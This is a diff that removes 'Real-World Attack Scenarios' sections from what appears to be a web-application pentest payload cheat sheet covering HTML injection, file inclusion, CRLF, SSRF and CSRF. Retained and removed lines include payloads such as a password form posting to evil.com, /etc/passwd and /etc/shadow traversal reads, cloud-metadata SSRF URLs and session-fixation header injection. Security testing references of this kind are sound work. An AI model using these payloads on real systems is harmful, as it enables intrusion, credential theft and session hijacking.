@@ -1300,15 +1300,6 @@ window.onload = setMessage;
 * Polyglot HTML: `<iframe/src=evil.com>`
 * Non-standard tags: `<customtag>Injected</customtag>`
 
-# 🔹 Real-World Attack Scenarios
-
-* Fake login page: `<form action="https://evil.com"><input name="password"></form>` → Credential theft.
-* UI defacement: `<h1>Website Hacked</h1>` → Visible defacement.
-* Click hijacking: `<a href="https://evil.com">Download</a>` → Misleading links.
-* Sensitive redirection: `<meta http-equiv="refresh" content="0;url=https://evil.com">`
-* Admin confusion: `<div>Welcome Admin</div>` → Social engineering.
----
-
 # 7. Local File Inclusion (LFI) and Remote File Inclusion (RFI)
 
 ### **Common LFI Parameters:**
@@ -1479,14 +1470,6 @@ http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/pas
 * Double extension:  `shell.php.png`
 * Trailing dot:  shell.php.`
 * Null byte (legacy): shell.php%00.jpg`
-
-# 🔹 Real-World Attack Scenarios
-
-* Sensitive file disclosure:    `../../../../etc/passwd` → Leak system users.
-* Source code disclosure:  `php://filter/...` → Reveal application logic.
-* Remote code execution:  Include uploaded shell or poisoned log.
-* Credential theft:  Read `/etc/shadow`, config files.
-* Full server compromise:  LFI → RCE via log/session poisoning.
 
 ### RCE via Mail
 
@@ -1767,14 +1750,6 @@ By injecting a CRLF sequence, the attacker can break the response into two parts
 * Unicode encoding:  %u000d%u000a
 * Raw newline injection:  \r\nX-Test: injected
 
-# 🔹 Real-World Attack Scenarios
-
-* Session fixation:  Inject Set-Cookie: session=attacker → Hijack session.
-* Cache poisoning:  Inject malicious HTML → Cached by CDN → served to users.
-* Open redirect:  Inject Location header → redirect victims.
-* Email abuse:  Inject BCC → send spam via application.
-* Security bypass:  Inject headers like X-Forwarded-For: 127.0.0.1
-
 ## Basic SSRF Payloads
 
 * Localhost access:  http://127.0.0.1 → Access internal services.
@@ -1898,14 +1873,6 @@ By injecting a CRLF sequence, the attacker can break the response into two parts
 * GCP header injection:  Metadata-Flavor: Google
 * Azure API version:  http://169.254.169.254/metadata/instance?api-version=2021-02-01
 
-# 🔹 Real-World Attack Scenarios
-
-* IAM credential theft → AWS metadata endpoint
-* Internal admin panel access → http://127.0.0.1/admin
-* Redis exploitation → gopher payload
-* Kubernetes takeover → access API server
-* File disclosure → file:///etc/passwd
-
 ## CSRF Test Case (with Bypass Cases)
 
 # 🔹 Basic CSRF Payloads
@@ -2008,14 +1975,6 @@ By injecting a CRLF sequence, the attacker can break the response into two parts
 
 * Use different HTML tags:  * <img>,  * <iframe>, \\,  * \\
 * Use delayed execution:  setTimeout(() => form.submit(), 1000)
-
-# 🔹 Real-World Attack Scenarios
-
-* Password change:  Auto-submit form → resets victim password.
-* Fund transfer:  Hidden POST → sends money.
-* Email change:  /change-email?email=evil@attacker.com
-* Account deletion:  /delete-account
-* Admin action abuse:  Silent admin operation using victim session.
 
 ## 7. Hostile Subdomain Takeover
 
